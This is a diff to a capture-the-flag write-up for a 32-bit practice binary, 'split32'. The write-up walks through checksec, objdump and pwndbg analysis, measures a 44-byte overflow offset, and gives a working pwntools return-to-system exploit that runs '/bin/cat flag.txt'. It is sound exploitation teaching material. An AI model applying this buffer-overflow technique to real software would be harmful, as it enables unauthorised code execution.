@@ -1,6 +1,5 @@
 First of all, use checksec to get some binary information
-
-```
+```shell
 [marco@marco-pc Downloads]$ file split32
 split32: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=f8a6d6bf3d264d331ecbf9d1e6858d6eac124b89, not stripped
 [marco@marco-pc Downloads]$ checksec --file=split32
@@ -9,9 +8,7 @@ Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RU
 ```
 
 The file is not stripped, so let's use objdump and gdb (with pwndbg) to get some information from symbol table
-
-
-```
+```shell
 [marco@marco-pc Downloads]$ objdump -t split32
 ...
 080485f6 l     F .text	00000053              pwnme
@@ -19,14 +16,13 @@ The file is not stripped, so let's use objdump and gdb (with pwndbg) to get some
 08048649 l     F .text	00000019              usefulFunction
 ...
 0804a030 g     O .data	0000001a              usefulString
-...
 ```
 
 There are some interesting stuff:
 - pwnme, which is called from main, print some strings and get an input;
 - usefulFunction perfom a system comand "/bin/ls"
 - usefulString is "/bin/cat flag.txt"
-```
+```gdb
 pwndbg> disassemble usefulFunction 
 Dump of assembler code for function usefulFunction:
    0x08048649 <+0>:	push   ebp
@@ -48,9 +44,7 @@ pwndbg> x/s 0x0804a030
 
 With a buffer overflow we can control the EIP. Jumping at system@plt with usefulString as parameter, we can read the flag.
 Let's find out how many bytes we need to fill until EIP
-
-```
-
+```gdb
 pwndbg> cyclic 50
 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama
 
@@ -72,28 +66,24 @@ Program received signal SIGSEGV, Segmentation fault.
 
 pwndbg> cyclic -l 'laaa'
 44
-
-...
 ```
 
 Final exploit:
-
 NOTE: I put exit address as return address for a clean execution but you can put 4 random bytes like "BBBB"
-
 ```python
-  1 from pwn import *
-  2 
-  3 system_addr = 0x8048430
-  4 string_addr = 0x804a030
-  5 exit_addr = 0xf7de96c0
-  6 
-  7 expl = ("A"*44).encode()
-  8 expl += p32(system_addr)
-  9 expl += p32(exit_addr)
- 10 expl += p32(string_addr)
- 11 
- 12 p = process('./split32')
- 13 p.recvuntil('>')
- 14 p.sendline(expl)
- 15 print(p.recvall().decode())
+from pwn import *
+
+system_addr = 0x8048430
+string_addr = 0x804a030
+exit_addr = 0xf7de96c0
+ 
+expl = ("A"*44).encode()
+expl += p32(system_addr)
+expl += p32(exit_addr)
+expl += p32(string_addr)
+ 
+p = process('./split32')
+p.recvuntil('>')
+p.sendline(expl)
+print(p.recvall().decode())
 ```
